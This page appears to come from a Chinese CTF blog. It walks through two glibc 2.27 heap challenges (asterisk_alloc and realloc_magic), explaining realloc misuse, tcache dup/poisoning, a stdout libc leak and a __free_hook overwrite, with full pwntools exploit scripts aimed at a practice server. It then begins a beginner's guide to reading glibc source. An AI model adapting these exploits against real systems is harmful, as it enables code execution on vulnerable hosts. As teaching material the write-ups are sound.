pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111533151-552713986.png"></p>
<h2 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h2><h3 id="收获与总结："><a href="#收获与总结：" class="headerlink" title="收获与总结："></a>收获与总结：</h3><p>这道题主要就是realloc函数的妙用，学到了关于这个函数很多新知识。这个函数会根据参数的不同来实现不同的功能，具体情况如下：</p>
<blockquote>
<p>realloc(ptr,size)函数</p>
<p>当size不合法，比如-1时，realloc函数就会返回NULL。</p>
<p>当size为0且ptr存在时，就会执行free(ptr)且返回NULL</p>
<p>当size正常且ptr不存在时，就会执行malloc(ptr)</p>
<p>当size正常且ptr存在时，这就涉及到了两种情况，第一种是size大于了ptr指向堆块的size，这种情况先判断ptr指向的堆块能否与top chunk或者位于高地址且free状态的堆块合并，如果合并后二者大小满足size则进行合并。如果不能合并的话再去申请一块新的内存，将原来的数据拷贝过来，再释放之前的堆块。第二种是size小于了ptr指向堆块的size，这种情况会留下size大小的堆块，将剩余部分的堆块给释放掉。</p>
</blockquote>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826113015547-280603116.png"></p>
<h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826113031894-2049890680.png"></p>
<p>free的时候没有将指针置空，存在UAF漏洞。当UAF配上2.27-3ubuntu1这个版本，实在是舒服至极，因为我们可以直接使用tcache dup。同时这道题保护为FULL RELRO还没有打印函数，那就可以基本确定打IO leak了。</p>
<h3 id="程序简单分析："><a href="#程序简单分析：" class="headerlink" title="程序简单分析："></a>程序简单分析：</h3><p>这道题有一点点特殊，没有edit函数没有show函数。但是add函数里存在三个申请内存的函数，分别是malloc calloc realloc函数。通过观察add和delete函数的代码，发现malloc和calloc函数只能用一次，因此这道题只能将目光放到realloc函数上。realloc函数对于参数的不同，自身也有很多不同的功能（文章开始已经说明了）</p>
<p>这道题的核心点并不是在于怎么将unsorted bin中的fd指针给弄到tcachebin上，这一点有好几种方法都可以，难点是不太好编辑这个unsorted bin中的fd指针。这里采用的方法是申请一个大堆块A，然后再用realloc函数申请一个小堆块B(要保证A_size-B_size&gt;0x80,让其满足释放后可以进入unsorted bin的大小)，由于堆块B的size小于A，这样就保留堆块B大小的size，将堆块A的剩余部分(堆块C)释放掉。然后释放八次堆块C，这样C就进入了unsorted bin中，然后我们执行realloc(ptr_B,sizeof(堆块A))，此时的效果就是将堆块C申请回来与堆块B合并成为了堆块A，而我们的数据就可以去正常编辑原本堆块C的unsorted bin的fd指针了。</p>
<p>剩下就是常规操作打一个tcache dup+poisoning将free_hook申请出来最后释放掉存有&#x2F;bin&#x2F;sh字符串的堆块了。</p>
<p>整个过程就在于一个realloc函数的妙用，因为我们要不断的改变并控制ptr_r那个值，所以经常穿插将其size设置为0或者-1。</p>
<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>下图为free掉一个堆块八次，然后unsorted bin中的fd指针就出现到了tcachebin中</p>
<p><img src="/../img/2706180-20220826113058600-240750503.png"></p>
<p>这部分的exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)<span class="comment">#这是大堆块	</span></span><br><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#执行完这行代码，上面的这个大堆块就变成了0x50的可用堆块和0xc0的free状态堆块</span></span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#不过在这步的时候0x50这个堆块也被释放了</span></span><br><span class="line">add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>接着我们要先控制ptr_r的值为0x50堆块的那个地址，所以我们先将其申请回来，然后我们再申请0x100这个大堆块，这样realloc函数就会向下合并(向高地址合并)。</p>
<p><img src="/../img/2706180-20220826113121671-909787527.png"><br><img src="/../img/2706180-20220826113129858-1012521380.png"></p>
<p>因为合并后可以写入0x100的数据，因此我们就可以直接控制堆块的fd指针，将其改为stdout结构体地址。</p>
<p>这步的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>然后剩下的部分就是常规操作的tcache dup+tcache poisoning了。<strong>要注意的是需要穿插realloc(ptr_r,-1)来控制ptr_r为空，再进行realloc时才是malloc函数。否则无法正常完成tcache poisoning。</strong></p>
<p>剩下这部分exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后放一下完整的exp<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_m</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_c</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_r</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Which</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>, <span class="built_in">str</span>(Which))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add_r(<span class="number">0x100</span>,<span class="string">&#x27;aaaaaaaaa&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x20</span>,<span class="string">&#x27;prevent chunk&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x40</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xDD0,0xDD7,0xdde,0xde5)</span></span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">    add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27177</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111557058-2083144726.png"></p>
<h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111633948-308368104.png"></p>
<p>这道题和上面那道题基本上一模一样，思路啥的也都一样。具体就不再放调试的图片了。具体的过程写到exp的注释里了。</p>
<p>一句话总结这题和上面那道题就是利用realloc向下合并的漏洞在tcachebin中踩出unsorted bin的fd指针。</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#e=ELF(&#x27;./a&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content?\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#先申请一个大堆块A</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#然后realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#申请一个用来防止合并的小堆块</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#realloc申请size为0的堆块，置空其指针</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#因为刚才申请size为0的堆块的时候，这个堆块A被释放了，现在再申请回来</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;s&#x27;</span>)<span class="comment">#此时堆块A变成了使用状态的堆块B+空闲状态的堆块C 堆块B为0x70 堆块C为0x80</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#置空指针</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;uuuu&#x27;</span>)<span class="comment">#将堆块C申请出来</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#上面释放了堆块C七次，加上这一次，堆块C成功进入了unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将堆块B申请回来</span></span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0x0</span>)*<span class="number">15</span>+p64(<span class="number">0x81</span>)+<span class="string">b&#x27;\x60\x87&#x27;</span>)<span class="comment">#利用realloc函数，向下合并空闲堆块，至此堆块A回来了，我们向堆块A写入数据就可以编辑原本堆块C的fd指针，从而将其改写为stdout结构体地址</span></span><br><span class="line">    <span class="comment">#上面步骤最核心的地方是这个0x81，本来这个位置的堆块C的实际大小为0x91，但如果我们不修改它，之后的tcache dup+tcache poisoning是没法进行的，必须要破坏它的size，才能保证下面步骤的正确进行。</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xba2,0xbae,0xA76)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#将stdout结构体申请了出来</span></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line"></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">666</span>))<span class="comment">#清空ptr指针，因为此时的ptr指针就是stdout结构体地址，如果对这个地址进行释放的话，程序会崩溃，因此我们需要用唯一的机会将其置零</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#接下来就是重复上面的步骤 tcache dup+tcache poisoning 往free_hook中写入system地址</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x91</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">    delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25279</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111647020-1771891318.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/aec37d93.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/aec37d93.html" class="post-title-link" itemprop="url">glibc中的源码该怎么读</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:51:10" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>在PWN的学习过程中，阅读glibc的源代码是一项必备的技能。一方面而言有些问题需要深入到源码中寻找答案，另一方面阅读源码来探究glibc中函数的实现是再合适不过的方法(有很多师傅做了优秀的总结，可不论怎么阅读他人的总结还是不如自己去实际的探究一下)，最后一方面，在不断探究和学习源码的过程中其实也在不断的进步并打下基础，如此看来阅读glibc中的源码百利而无一害。但我对于第一次尝试阅读源码的印象颇深，无从下手，不知所措。于是乎我写下了这篇文章，来向当初和我一样入门的师傅们提供一些经验和建议。</p>
<p><strong>由于本人水平有限，提供的思路和建议未必是最好的，但应该是当下在我的认知中对我而言是最合适的了。如果有错误或更方便的做法，师傅们也可以提出来。</strong></p>
<h2 id="1、准备环境-amp-工具-amp-源码"><a href="#1、准备环境-amp-工具-amp-源码" class="headerlink" title="1、准备环境&amp;工具&amp;源码"></a>1、准备环境&amp;工具&amp;源码</h2><p>我们需要先把环境和工具准备好，这个其实很好搞。</p>
<p>我们需要去搞一下gdb源码调试的这个功能，尤其是在初学的时候，源码基本每行都看不懂(至少当时我是这样hhh)，那就必须要配合着gdb动态调试看源码了，这样我们可以去看一些变量的值，以及程序的走向又或者函数的调用关系等等。对于最初的萌新来说，这样就舒服很多了。</p>
<p>如何搭建gdb源码调试的环境可以看我的这篇文章  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a></p>
<p>其次就是工具，工具的话建议选择vscode，这个具体咋搞就百度吧。</p>
<p>最后源码在这里下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure>

<p>里面有很多个版本的glibc，如果没有特殊需要的话最好下载2.23-0ubuntu3这个版本。</p>
<p>最后打开vscode，将刚才下载的glibc的文件打开(说实话正常的话下面两张图片没必要放，因为现在在我看来这些步骤应该是理所当然，但我初学的时候其实连这个都不知道，也算是给曾经的自己看一下吧)</p>
<img src="https://s2.loli.net/2022/08/13/95XpLcSAPbKHMWI.png" alt="image-20220812222510249" style="zoom:50%;" />

<p>glibc中的文件有很多，选择我们需要分析的那个函数所在的文件夹即可。比如我要分析fopen函数，那就打开这个libio这个文件(想知道函数在哪个文件夹的话，百度一下即可)</p>
<p><img src="https://s2.loli.net/2022/08/13/ObFPWU6IGCpvHun.png" alt="image-20220812222621903"></p>
<h2 id="2、vscode的一些快捷键"><a href="#2、vscode的一些快捷键" class="headerlink" title="2、vscode的一些快捷键"></a>2、vscode的一些快捷键</h2><p>要说分析源码，不得不提的就是一些快捷键。使用快捷键和不使用快捷键的效率简直天差地别。</p>
<p>假设我现在在分析代码的1352行，这里出现了_IO_default_xsputn函数，如果我们要查看该函数定义的地方的话，ctrl+左键点击该函数，即可跳转到定义的地方。(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/13/cELKu7FjeRkxwvC.png" alt="image-20220812223435147"></p>
<p>下图是我们已经跳转到函数定义的地方了，但是有一个很难受的事情就是，如果我们想回去刚才的代码继续分析还要手动再找回去么？ 我们可以使用快捷键Alt加&lt;-键(这个&lt;-键就是键盘里那个上下左右键的左)返回到刚刚的代码，同理Alt加-&gt;键可以再回到函数定义的地方。</p>
<img src="https://s2.loli.net/2022/08/13/CRyAYrdj6JwGsQp.png" alt="image-20220812223643803" style="zoom:50%;" />



<p>ctrl+f是在当前文件搜索指定的内容</p>
<p>ctrl+z就是撤回刚刚的一步操作</p>
<h2 id="3、宏-amp-如何溯源解决问题"><a href="#3、宏-amp-如何溯源解决问题" class="headerlink" title="3、宏&amp;如何溯源解决问题"></a>3、宏&amp;如何溯源解决问题</h2><p>在glibc源码分析中，宏定义十分常见(如果不知道什么是宏可以百度一下)</p>
<p>有可能你眼前这个陌生的东西就是个宏。(初学的时候，我看源码一脸懵，心想咋这么多东西我都没见过，我学的假的c语言么？)</p>
<p>以下面432这行代码为例：</p>
<p>发现上来就是一个_IO_size_t干懵萌新，因为之前没见过啊。</p>
<p><img src="https://s2.loli.net/2022/08/13/jeMiwLNGrAVnbHT.png" alt="image-20220812224439901"></p>
<p>我们ctrl+左键溯源一下这个_IO_size_t(如下图)，发现是个宏定义，不过size_t还是没见过呀，那就继续溯源</p>
<p><img src="https://s2.loli.net/2022/08/13/AC95BZto1L7rNge.png" alt="image-20220812224614100"></p>
<p>发现最终是typedef给unsigned __int64新定义了一个名字叫做size_t（不清楚typedef的请自行百度）</p>
<p><img src="https://s2.loli.net/2022/08/13/D1iZ68ECtof495l.png" alt="image-20220812224707086"></p>
<p>这下子unsigned int64我们认识了，这不就是无符号整形变量么，ok问题解决，最初的那行代码其实就是unsigned int64 count 定义了count这个变量，仅此而已。</p>
<p>下面放一个我初学时的问题，下面这个结构体Elf32_Sym为什么是16字节？(我在这里并不是想表达这个结构体是多大，<strong>我是想强调我们在面对不会的问题的时候，解决的思路应该如何</strong>)</p>
